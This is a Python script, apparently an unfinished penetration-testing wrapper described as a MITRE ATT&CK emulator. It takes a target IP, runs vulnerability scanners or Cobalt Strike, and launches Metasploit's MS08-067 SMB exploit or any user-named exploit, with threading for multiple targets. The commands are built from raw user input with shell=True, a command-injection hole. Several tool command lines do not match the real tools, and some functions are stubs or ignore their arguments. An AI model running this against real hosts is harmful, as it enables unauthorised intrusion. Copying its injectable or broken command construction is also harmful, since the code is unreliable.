######################################################################################################################################################################################################################
# ###Under Construction### Python adversary emulation simulator, in line with the MITRE ATT&CK Framerwork. sudo python3 mitre_att&ck.py. Requires a linux virtual environment. 
# Performs simulations or real world attacks based on selections. Note: Real world penatration test attack selection will attempt to exploit discovered vulnerabilities based on logic. 
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################

import subprocess
import threading
import os
import json

# DISCLAIMER: This script is intended for educational purposes only. You must have explicit permission to test the target systems.
print("DISCLAIMER: This script is intended for educational purposes only. You must have explicit permission to test the target systems.")

# Load MITRE ATT&CK framework (you can update this URL or load a local file with tactics and techniques)
mitre_url = "https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json"

# Fetch and load MITRE ATT&CK data
def load_mitre_data():
    print("[INFO] Loading MITRE ATT&CK framework data...")
    response = subprocess.run(["curl", "-s", mitre_url], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    data = response.stdout.decode()
    mitre_data = json.loads(data)
    return mitre_data

mitre_data = load_mitre_data()

# Function to run Nessus scan
def run_nessus_scan(target_ip):
    print(f"[INFO] Running Nessus scan against {target_ip}...")
    nessus_command = f"nessus -T html -q -p 8834 -i {target_ip}"
    result = subprocess.run(nessus_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = result.stdout.decode() + "\n" + result.stderr.decode()
    print(f"[INFO] Nessus scan output:\n{output}")
    return output

# Function to run OpenVAS scan
def run_openvas_scan(target_ip):
    print(f"[INFO] Running OpenVAS scan against {target_ip}...")
    openvas_command = f"openvas -T html -p {target_ip}"
    result = subprocess.run(openvas_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = result.stdout.decode() + "\n" + result.stderr.decode()
    print(f"[INFO] OpenVAS scan output:\n{output}")
    return output

# Function to run Nikto scan
def run_nikto_scan(target_ip):
    print(f"[INFO] Running Nikto scan against {target_ip}...")
    nikto_command = f"nikto -h {target_ip}"
    result = subprocess.run(nikto_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = result.stdout.decode() + "\n" + result.stderr.decode()
    print(f"[INFO] Nikto scan output:\n{output}")
    return output

# Function to run Cobalt Strike (assuming it's installed)
def run_cobalt_strike(target_ip):
    print(f"[INFO] Running Cobalt Strike against {target_ip}...")
    cobalt_strike_command = f"cobaltstrike -T {target_ip}"
    result = subprocess.run(cobalt_strike_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = result.stdout.decode() + "\n" + result.stderr.decode()
    print(f"[INFO] Cobalt Strike output:\n{output}")
    return output

# Function to choose between simulation and real attacks
def select_attack_mode():
    print("[INFO] Choose attack mode:")
    print("1. Simulation Mode (Educational, Safe)")
    print("2. Real World Penetration Testing Mode (Requires Consent)")
    mode = input("Enter choice (1/2): ")
    
    if mode == "1":
        print("[INFO] Running in Simulation Mode...")
        run_simulation()  # Function to simulate educational attack
    elif mode == "2":
        print("[INFO] Running in Penetration Testing Mode...")
        run_penetration_test()  # Function for real exploitation
    else:
        print("[ERROR] Invalid mode selected.")

# Function to simulate educational attack (Simulation Mode)
def run_simulation():
    print("[INFO] Running simulation mode... (no real exploitation will occur)")

# Function to handle penetration testing actions (Real Attack Mode)
def run_penetration_test():
    target_ip = input("[INFO] Enter the target IP: ")
    
    print("[INFO] Select scanning tool to use:")
    print("1. Nessus")
    print("2. OpenVAS")
    print("3. Nikto")
    print("4. Cobalt Strike")
    scan_choice = input("Enter choice (1-4): ")

    if scan_choice == "1":
        run_nessus_scan(target_ip)
    elif scan_choice == "2":
        run_openvas_scan(target_ip)
    elif scan_choice == "3":
        run_nikto_scan(target_ip)
    elif scan_choice == "4":
        run_cobalt_strike(target_ip)
    else:
        print("[ERROR] Invalid choice. Proceeding without scan.")
    
    print("[INFO] Select exploit tool to use:")
    print("1. Metasploit (e.g., MS08-067)")
    print("2. Custom Exploit")
    exploit_choice = input("Enter choice (1-2): ")

    if exploit_choice == "1":
        exploit_name = "exploit/windows/smb/ms08_067_netapi"
        select_and_run_exploit(target_ip, exploit_name)
    elif exploit_choice == "2":
        print("[INFO] Custom Exploit selected.")
        exploit_name = input("[INFO] Enter the exploit name: ")
        select_and_run_exploit(target_ip, exploit_name)
    else:
        print("[ERROR] Invalid choice. No exploit run.")

# Function to select and run the appropriate exploit
def select_and_run_exploit(target_ip, exploit_name):
    print(f"[INFO] Selecting exploit {exploit_name} for {target_ip}...")
    msf_command = f"msfconsole -x 'use {exploit_name}; set RHOST {target_ip}; run'"
    result = subprocess.run(msf_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = result.stdout.decode() + "\n" + result.stderr.decode()
    print(f"[INFO] Exploit output:\n{output}")
    return output

# Multi-target scan handler (scan and exploit multiple systems in parallel)
def scan_and_exploit_multiple_targets(targets):
    threads = []
    for target in targets:
        thread = threading.Thread(target=process_target, args=(target,))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()

# Function to process each target
def process_target(target_ip):
    run_penetration_test()  # This will invoke scan and exploit

# Fetch and match vulnerabilities to MITRE ATT&CK framework
def match_vulnerabilities_to_mitre(vulnerabilities):
    for vuln in vulnerabilities:
        print(f"[INFO] Matching {vuln} to MITRE ATT&CK tactics...")
        for technique in mitre_data['objects']:
            if technique.get("type") == "attack-pattern" and technique.get("name").lower() in vuln.lower():
                print(f"[INFO] Match found: {technique['name']}")

# Main menu to start the process
def main():
    print("Welcome to the Penetration Testing Framework")
    
    while True:
        print("\nSelect an option:")
        print("1. Start Penetration Test")
        print("2. Exit")
        choice = input("Enter your choice: ")
        
        if choice == "1":
            select_attack_mode()
        elif choice == "2":
            print("[INFO] Exiting the framework.")
            break
        else:
            print("[ERROR] Invalid choice. Please try again.")

# Run the main function
if __name__ == "__main__":
    main()
